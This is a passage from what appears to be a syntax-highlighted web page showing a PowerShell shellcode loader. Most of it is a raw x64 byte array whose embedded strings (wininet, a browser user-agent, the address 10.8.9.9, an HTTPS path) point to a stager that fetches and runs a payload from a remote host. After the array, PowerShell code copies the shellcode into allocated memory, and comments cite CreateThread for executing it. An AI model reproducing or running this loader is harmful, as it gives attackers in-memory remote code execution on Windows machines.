class="nx">0x48</span><span class="p">,</span><span class="nx">0x1</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0x50</span><span class="p">,</span><span class="nx">0x44</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x40</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0x1</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0xe3</span><span class="p">,</span><span class="nx">0x56</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x34</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x1</span><span class="p">,</span><span class="nx">0xd6</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xc0</span><span class="p">,</span><span class="nx">0xac</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0xc1</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0xd</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x1</span><span class="p">,</span><span class="nx">0xc1</span><span class="p">,</span><span class="nx">0x38</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x75</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x4c</span><span class="p">,</span><span class="nx">0x3</span><span class="p">,</span><span class="nx">0x4c</span><span class="p">,</span><span class="nx">0x24</span><span class="p">,</span><span class="nx">0x8</span><span class="p">,</span><span class="nx">0x45</span><span class="p">,</span><span class="nx">0x39</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0x75</span><span class="p">,</span><span class="nx">0xd8</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x44</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x40</span><span class="p">,</span><span class="nx">0x24</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0x1</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x66</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0xc</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x44</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x40</span><span class="p">,</span><span class="nx">0x1c</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0x1</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x4</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x5e</span><span class="p">,</span><span class="nx">0x59</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x1</span><span class="p">,</span><span class="nx">0xd0</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x59</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0xec</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x59</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x12</span><span class="p">,</span><span class="nx">0xe9</span><span class="p">,</span><span class="nx">0x4b</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0x5d</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xdb</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0xbe</span><span class="p">,</span><span class="nx">0x77</span><span class="p">,</span><span class="nx">0x69</span><span class="p">,</span><span class="nx">0x6e</span><span class="p">,</span><span class="nx">0x69</span><span class="p">,</span><span class="nx">0x6e</span><span class="p">,</span><span class="nx">0x65</span><span class="p">,</span><span class="nx">0x74</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x56</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xe1</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0xc7</span><span class="p">,</span><span class="nx">0xc2</span><span class="p">,</span><span class="nx">0x4c</span><span class="p">,</span><span class="nx">0x77</span><span class="p">,</span><span class="nx">0x26</span><span class="p">,</span><span class="nx">0x7</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xd5</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0xe8</span><span class="p">,</span><span class="nx">0x51</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x6f</span><span class="p">,</span><span class="nx">0x7a</span><span class="p">,</span><span class="nx">0x69</span><span class="p">,</span><span class="nx">0x6c</span><span class="p">,</span><span class="nx">0x6c</span><span class="p">,</span><span class="nx">0x61</span><span class="p">,</span><span class="nx">0x2f</span><span class="p">,</span><span class="nx">0x35</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x30</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x28</span><span class="p">,</span><span class="nx">0x57</span><span class="p">,</span><span class="nx">0x69</span><span class="p">,</span><span class="nx">0x6e</span><span class="p">,</span><span class="nx">0x64</span><span class="p">,</span><span class="nx">0x6f</span><span class="p">,</span><span class="nx">0x77</span><span class="p">,</span><span class="nx">0x73</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x4e</span><span class="p">,</span><span class="nx">0x54</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0x30</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x30</span><span class="p">,</span><span class="nx">0x3b</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x57</span><span class="p">,</span><span class="nx">0x69</span><span class="p">,</span><span class="nx">0x6e</span><span class="p">,</span><span class="nx">0x36</span><span class="p">,</span><span class="nx">0x34</span><span class="p">,</span><span class="nx">0x3b</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x78</span><span class="p">,</span><span class="nx">0x36</span><span class="p">,</span><span class="nx">0x34</span><span class="p">,</span><span class="nx">0x3b</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x72</span><span class="p">,</span><span class="nx">0x76</span><span class="p">,</span><span class="nx">0x3a</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0x33</span><span class="p">,</span><span class="nx">0x33</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x30</span><span class="p">,</span><span class="nx">0x29</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x47</span><span class="p">,</span><span class="nx">0x65</span><span class="p">,</span><span class="nx">0x63</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0x6f</span><span class="p">,</span><span class="nx">0x2f</span><span class="p">,</span><span class="nx">0x32</span><span class="p">,</span><span class="nx">0x30</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0x30</span><span class="p">,</span><span class="nx">0x30</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0x30</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x46</span><span class="p">,</span><span class="nx">0x69</span><span class="p">,</span><span class="nx">0x72</span><span class="p">,</span><span class="nx">0x65</span><span class="p">,</span><span class="nx">0x66</span><span class="p">,</span><span class="nx">0x6f</span><span class="p">,</span><span class="nx">0x78</span><span class="p">,</span><span class="nx">0x2f</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0x33</span><span class="p">,</span><span class="nx">0x33</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x30</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x59</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xc0</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0xba</span><span class="p">,</span><span class="nx">0x3a</span><span class="p">,</span><span class="nx">0x56</span><span class="p">,</span><span class="nx">0x79</span><span class="p">,</span><span class="nx">0xa7</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xd5</span><span class="p">,</span><span class="nx">0xe8</span><span class="p">,</span><span class="nx">0x9</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0x30</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x38</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x39</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x39</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xc1</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0xc7</span><span class="p">,</span><span class="nx">0xc0</span><span class="p">,</span><span class="nx">0xbb</span><span class="p">,</span><span class="nx">0x1</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x6a</span><span class="p">,</span><span class="nx">0x3</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0xba</span><span class="p">,</span><span class="nx">0x57</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0x9f</span><span class="p">,</span><span class="nx">0xc6</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xd5</span><span class="p">,</span><span class="nx">0xe8</span><span class="p">,</span><span class="nx">0x90</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x2f</span><span class="p">,</span><span class="nx">0x35</span><span class="p">,</span><span class="nx">0x43</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x59</span><span class="p">,</span><span class="nx">0x56</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0x30</span><span class="p">,</span><span class="nx">0x42</span><span class="p">,</span><span class="nx">0x35</span><span class="p">,</span><span class="nx">0x43</span><span class="p">,</span><span class="nx">0x39</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x71</span><span class="p">,</span><span class="nx">0x45</span><span class="p">,</span><span class="nx">0x47</span><span class="p">,</span><span class="nx">0x71</span><span class="p">,</span><span class="nx">0x4b</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x42</span><span class="p">,</span><span class="nx">0x38</span><span class="p">,</span><span class="nx">0x38</span><span class="p">,</span><span class="nx">0x51</span><span class="p">,</span><span class="nx">0x38</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x70</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x72</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x63</span><span class="p">,</span><span class="nx">0x4e</span><span class="p">,</span><span class="nx">0x47</span><span class="p">,</span><span class="nx">0x64</span><span class="p">,</span><span class="nx">0x44</span><span class="p">,</span><span class="nx">0x77</span><span class="p">,</span><span class="nx">0x62</span><span class="p">,</span><span class="nx">0x76</span><span class="p">,</span><span class="nx">0x4e</span><span class="p">,</span><span class="nx">0x70</span><span class="p">,</span><span class="nx">0x6e</span><span class="p">,</span><span class="nx">0x66</span><span class="p">,</span><span class="nx">0x65</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0x71</span><span class="p">,</span><span class="nx">0x6a</span><span class="p">,</span><span class="nx">0x73</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0x46</span><span class="p">,</span><span class="nx">0x4b</span><span class="p">,</span><span class="nx">0x7a</span><span class="p">,</span><span class="nx">0x6f</span><span class="p">,</span><span class="nx">0x6c</span><span class="p">,</span><span class="nx">0x78</span><span class="p">,</span><span class="nx">0x46</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0x6f</span><span class="p">,</span><span class="nx">0x79</span><span class="p">,</span><span class="nx">0x47</span><span class="p">,</span><span class="nx">0x69</span><span class="p">,</span><span class="nx">0x61</span><span class="p">,</span><span class="nx">0x42</span><span class="p">,</span><span class="nx">0x32</span><span class="p">,</span><span class="nx">0x6c</span><span class="p">,</span><span class="nx">0x6f</span><span class="p">,</span><span class="nx">0x61</span><span class="p">,</span><span class="nx">0x69</span><span class="p">,</span><span class="nx">0x4b</span><span class="p">,</span><span class="nx">0x67</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0x6e</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0x4f</span><span class="p">,</span><span class="nx">0x32</span><span class="p">,</span><span class="nx">0x32</span><span class="p">,</span><span class="nx">0x38</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x72</span><span class="p">,</span><span class="nx">0x77</span><span class="p">,</span><span class="nx">0x57</span><span class="p">,</span><span class="nx">0x57</span><span class="p">,</span><span class="nx">0x4e</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x4b</span><span class="p">,</span><span class="nx">0x5f</span><span class="p">,</span><span class="nx">0x46</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x2d</span><span class="p">,</span><span class="nx">0x2d</span><span class="p">,</span><span class="nx">0x73</span><span class="p">,</span><span class="nx">0x57</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0x75</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x37</span><span class="p">,</span><span class="nx">0x4b</span><span class="p">,</span><span class="nx">0x64</span><span class="p">,</span><span class="nx">0x4a</span><span class="p">,</span><span class="nx">0x5f</span><span class="p">,</span><span class="nx">0x6d</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x36</span><span class="p">,</span><span class="nx">0x4a</span><span class="p">,</span><span class="nx">0x30</span><span class="p">,</span><span class="nx">0x6c</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0x6a</span><span class="p">,</span><span class="nx">0x4c</span><span class="p">,</span><span class="nx">0x68</span><span class="p">,</span><span class="nx">0x67</span><span class="p">,</span><span class="nx">0x6b</span><span class="p">,</span><span class="nx">0x67</span><span class="p">,</span><span class="nx">0x4b</span><span class="p">,</span><span class="nx">0x43</span><span class="p">,</span><span class="nx">0x30</span><span class="p">,</span><span class="nx">0x56</span><span class="p">,</span><span class="nx">0x4b</span><span class="p">,</span><span class="nx">0x51</span><span class="p">,</span><span class="nx">0x46</span><span class="p">,</span><span class="nx">0x54</span><span class="p">,</span><span class="nx">0x43</span><span class="p">,</span><span class="nx">0x51</span><span class="p">,</span><span class="nx">0x51</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x68</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x66</span><span class="p">,</span><span class="nx">0x76</span><span class="p">,</span><span class="nx">0x66</span><span class="p">,</span><span class="nx">0x62</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x57</span><span class="p">,</span><span class="nx">0x70</span><span class="p">,</span><span class="nx">0x45</span><span class="p">,</span><span class="nx">0x73</span><span class="p">,</span><span class="nx">0x54</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x42</span><span class="p">,</span><span class="nx">0x67</span><span class="p">,</span><span class="nx">0x54</span><span class="p">,</span><span class="nx">0x6d</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xc1</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0xb8</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x32</span><span class="p">,</span><span class="nx">0xa8</span><span class="p">,</span><span class="nx">0x84</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x50</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0xc7</span><span class="p">,</span><span class="nx">0xc2</span><span class="p">,</span><span class="nx">0xeb</span><span class="p">,</span><span class="nx">0x55</span><span class="p">,</span><span class="nx">0x2e</span><span class="p">,</span><span class="nx">0x3b</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xd5</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xc6</span><span class="p">,</span><span class="nx">0x6a</span><span class="p">,</span><span class="nx">0xa</span><span class="p">,</span><span class="nx">0x5f</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x6a</span><span class="p">,</span><span class="nx">0x1f</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x52</span><span class="p">,</span><span class="nx">0x68</span><span class="p">,</span><span class="nx">0x80</span><span class="p">,</span><span class="nx">0x33</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x6a</span><span class="p">,</span><span class="nx">0x4</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x59</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0xba</span><span class="p">,</span><span class="nx">0x75</span><span class="p">,</span><span class="nx">0x46</span><span class="p">,</span><span class="nx">0x9e</span><span class="p">,</span><span class="nx">0x86</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xd5</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xc0</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0x4d</span><span class="p">,</span><span class="nx">0x31</span><span class="p">,</span><span class="nx">0xc9</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0xc7</span><span class="p">,</span><span class="nx">0xc2</span><span class="p">,</span><span class="nx">0x2d</span><span class="p">,</span><span class="nx">0x6</span><span class="p">,</span><span class="nx">0x18</span><span class="p">,</span><span class="nx">0x7b</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xd5</span><span class="p">,</span><span class="nx">0x85</span><span class="p">,</span><span class="nx">0xc0</span><span class="p">,</span><span class="nx">0x75</span><span class="p">,</span><span class="nx">0x1f</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0xc7</span><span class="p">,</span><span class="nx">0xc1</span><span class="p">,</span><span class="nx">0x88</span><span class="p">,</span><span class="nx">0x13</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0xba</span><span class="p">,</span><span class="nx">0x44</span><span class="p">,</span><span class="nx">0xf0</span><span class="p">,</span><span class="nx">0x35</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xd5</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xcf</span><span class="p">,</span><span class="nx">0x74</span><span class="p">,</span><span class="nx">0x2</span><span class="p">,</span><span class="nx">0xeb</span><span class="p">,</span><span class="nx">0xaa</span><span class="p">,</span><span class="nx">0xe8</span><span class="p">,</span><span class="nx">0x55</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x59</span><span class="p">,</span><span class="nx">0x6a</span><span class="p">,</span><span class="nx">0x40</span><span class="p">,</span><span class="nx">0x5a</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xd1</span><span class="p">,</span><span class="nx">0xc1</span><span class="p">,</span><span class="nx">0xe2</span><span class="p">,</span><span class="nx">0x10</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0xc7</span><span class="p">,</span><span class="nx">0xc0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x10</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0xba</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0xa4</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0xe5</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xd5</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x93</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x53</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xe7</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xf1</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xda</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0xc7</span><span class="p">,</span><span class="nx">0xc0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xf9</span><span class="p">,</span><span class="nx">0x49</span><span class="p">,</span><span class="nx">0xba</span><span class="p">,</span><span class="nx">0x12</span><span class="p">,</span><span class="nx">0x96</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xe2</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xd5</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x83</span><span class="p">,</span><span class="nx">0xc4</span><span class="p">,</span><span class="nx">0x20</span><span class="p">,</span><span class="nx">0x85</span><span class="p">,</span><span class="nx">0xc0</span><span class="p">,</span><span class="nx">0x74</span><span class="p">,</span><span class="nx">0xb2</span><span class="p">,</span><span class="nx">0x66</span><span class="p">,</span><span class="nx">0x8b</span><span class="p">,</span><span class="nx">0x7</span><span class="p">,</span><span class="nx">0x48</span><span class="p">,</span><span class="nx">0x1</span><span class="p">,</span><span class="nx">0xc3</span><span class="p">,</span><span class="nx">0x85</span><span class="p">,</span><span class="nx">0xc0</span><span class="p">,</span><span class="nx">0x75</span><span class="p">,</span><span class="nx">0xd2</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0xc3</span><span class="p">,</span><span class="nx">0x58</span><span class="p">,</span><span class="nx">0x6a</span><span class="p">,</span><span class="nx">0x0</span><span class="p">,</span><span class="nx">0x59</span><span class="p">,</span><span class="nx">0xbb</span><span class="p">,</span><span class="nx">0xe0</span><span class="p">,</span><span class="nx">0x1d</span><span class="p">,</span><span class="nx">0x2a</span><span class="p">,</span><span class="nx">0xa</span><span class="p">,</span><span class="nx">0x41</span><span class="p">,</span><span class="nx">0x89</span><span class="p">,</span><span class="nx">0xda</span><span class="p">,</span><span class="nx">0xff</span><span class="p">,</span><span class="nx">0xd5</span><span class="w">

</span><span class="c"># Copy shellcode to the created memory region</span><span class="w">

</span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">Copy</span><span class="p">(</span><span class="nv">$buf</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$lpMem</span><span class="p">,</span><span class="w"> </span><span class="nv">$buf</span><span class="o">.</span><span class="nf">length</span><span class="p">)</span><span class="w">

</span><span class="c"># https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread - Microsoft Docs</span><span class="w">
</span><span class="c"># https://www.pinvoke.net/default.aspx/kernel32.createthread - PInvoke</span><span class="w">

